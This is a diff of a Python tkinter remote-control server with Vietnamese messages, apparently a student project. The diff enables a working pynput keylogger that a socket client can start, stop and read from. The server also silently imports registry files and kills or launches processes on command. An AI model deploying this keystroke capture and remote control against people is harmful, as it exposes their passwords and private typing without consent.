@@ -3,9 +3,13 @@ import os
 import tkinter as tk
 import winreg
 from io import BytesIO
+from pynput.keyboard import Key, Listener
 
 HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
 PORT = 65432        # Port to listen on (non-privileged ports are > 1023)
+
+def sendData(sock, msg):
+    sock.sendall(bytes(msg, "utf8"))
 
 def Line(lines):
     if (len(lines) > 0):
@@ -20,16 +24,16 @@ def Line(lines):
 def receive(sock, lines):
     buffer = BytesIO()
     try:
-        resp = sock.recv(100)       # Read in some number of bytes -- balance this
+        resp = sock.recv(100)       
     except:
         return              
     else:
-        buffer.write(resp)          # Write to the BytesIO object
-        buffer.seek(0)              # Set the file pointer to the SoF
-        start_index = 0             # Count the number of characters processed
+        buffer.write(resp)          
+        buffer.seek(0)              
+        start_index = 0             
         for line in buffer:
             start_index += len(line)
-            lines.append(line)       # Do something with your line
+            lines.append(line)       
         if start_index:
             buffer.seek(start_index)
             remaining = buffer.read()
@@ -148,9 +152,9 @@ def registry(sock, lines):
             fin.close()
             try:
                 os.system('wmic process call create \'regedit.exe /s fileReg.reg\'')
-                sock.sendall("Sửa thành công\n")
+                sendData(sock, "Sửa thành công\n")
             except:
-                sock.sendall("Sửa thất bại\n")
+                sendData(sock, "Sửa thất bại\n")
         elif (s == "SEND"):
             option = receiveLine(sock, lines)
             print(option)
@@ -177,12 +181,12 @@ def registry(sock, lines):
                     s = deleteValue(link, valueName)
                 else:
                     s = "Lỗi\n"
-            sock.sendall(s)
+            sendData(sock, s)
             #print(s)
         else:
             return
 
-"""
+
 def printKeys(sock, keys):
     data = ""
     for key in keys:
@@ -201,10 +205,21 @@ def printKeys(sock, keys):
         if k == "Key.shift" or k == "Key.esc":
             k = ""
         data += k
-    sock.sendall(data)
+    sendData(sock, data)
+    #print(data)
 
 def keylog(sock, lines):
     keys = []
+
+    def on_press(key):
+        keys.append(key)
+
+    def on_release(key):
+        if key == Key.esc:
+            return False
+
+    isHook = False
+    listener = Listener()
     while (True):
         s = receiveLine(sock, lines)
         data = []
@@ -212,18 +227,20 @@ def keylog(sock, lines):
             printKeys(sock, keys)
             keys.clear()
         elif (s == "HOOK"):
-            while (receiveLine(sock, lines) == "QUIT"):
-                keyLogger_hook()
-            else:
-                line -= 1
+            if (isHook == False):
+                isHook = True
+                listener = Listener(on_press = on_press, on_release = on_release)
+                listener.start()
         elif (s == "UNHOOK"):
-            while (receiveLine(sock, lines) == "QUIT"):
-                keyLogger_unhook()
-            else:
-                line -= 1
+            if (isHook == True):
+                isHook = False
+                listener.stop()
         else:
+            if (isHook == True):
+                isHook = False
+                listener.stop()
             return
-"""
+
 
 def takepic():
     pass
@@ -233,7 +250,7 @@ def process(sock, lines):
         s = receiveLine(sock, lines)
         if (s == "XEM"):
             process = os.popen('wmic process get Name, ProcessId, ThreadCount').read()
-            sock.sendall((bytes(process + '\n')))
+            sendData(sock, process + '\n')
             #print(process)
         elif (s == "KILL"):
             test = True
@@ -246,14 +263,14 @@ def process(sock, lines):
                             listID = os.popen('wmic process get ProcessId').read()
                             listID = listID.split('\n')
                             if (id not in listID):
-                                sock.sendall("Lỗi\n")
+                                sendData(sock, "Lỗi\n")
                                 #print("Lỗi\n")
                             else:
                                 os.system('wmic process where ProcessId=%a delete'%(id))
-                                sock.sendall("Đã diệt process\n")
+                                sendData(sock, "Đã diệt process\n")
                                 #print("Đã diệt process\n")
                         except:
-                            sock.sendall("Lỗi\n")
+                            sendData(sock, "Lỗi\n")
                             #print("Lỗi\n")  
                 else:
                     test = False
@@ -267,10 +284,10 @@ def process(sock, lines):
                     processName = "\'" + processName + "\'"
                     try:
                         os.system('wmic process call create %s'%(processName))
-                        sock.sendall("Process đã được bật\n")
+                        sendData(sock, "Process đã được bật\n")
                         #print("Process đã được bật\n")
                     except:
-                        sock.sendall("Lỗi\n")
+                        sendData(sock, "Lỗi\n")
                         #print("Lỗi\n")
                 else:
                     test = False
@@ -283,7 +300,7 @@ def application(sock, lines):
         s = receiveLine(sock, lines)
         if (s == "XEM"):
             listApp = os.popen('powershell "gps | where {$_.MainWindowTitle } | select name, id, {$_.Threads.Count}').read()
-            sock.sendall(listApp + '\n')
+            sendData(sock, listApp + '\n')
             #print(listApp + '\n')
         elif (s == "KILL"):
             test = True
@@ -296,14 +313,14 @@ def application(sock, lines):
                             listID = os.popen('powershell "gps | where {$_.MainWindowTitle } | select id').read()
                             listID = listID.split('\n')
                             if (id not in listID):
-                                sock.sendall("Lỗi\n")
+                                sendData(sock, "Lỗi\n")
                                 #print("Lỗi\n")
                             else:
                                 os.system('wmic process where ProcessId=%a delete'%(id))
-                                sock.sendall("Đã diệt chương trình\n")
+                                sendData(sock, "Đã diệt chương trình\n")
                                 #print("Đã diệt chương trình\n")
                         except:
-                            sock.sendall("Lỗi\n")  
+                            sendData(sock, "Lỗi\n")  
                             #print("Lỗi\n")
                 else:
                     test = False
@@ -317,10 +334,10 @@ def application(sock, lines):
                     appName = "\'" + appName + "\'"
                     try:
                         os.system('wmic process call create %s'%(appName))
-                        sock.sendall("Chương trình đã được bật\n")
+                        sendData(sock, "Chương trình đã được bật\n")
                         #print("Chương trình đã bật\n")
                     except:
-                        sock.sendall("Lỗi\n")
+                        sendData(sock, "Lỗi\n")
                         #print("Lỗi\n")
                 else:
                     test = False
@@ -340,8 +357,7 @@ def buttonServer_click():
             while True:
                 str = receiveLine(conn, lines)
                 if (str == "KEYLOG"):
-                    #keylog()
-                    pass
+                    keylog(conn, lines)
                 elif (str == "REGISTRY"):
                     registry(conn, lines)
                 elif (str == "SHUTDOWN"):
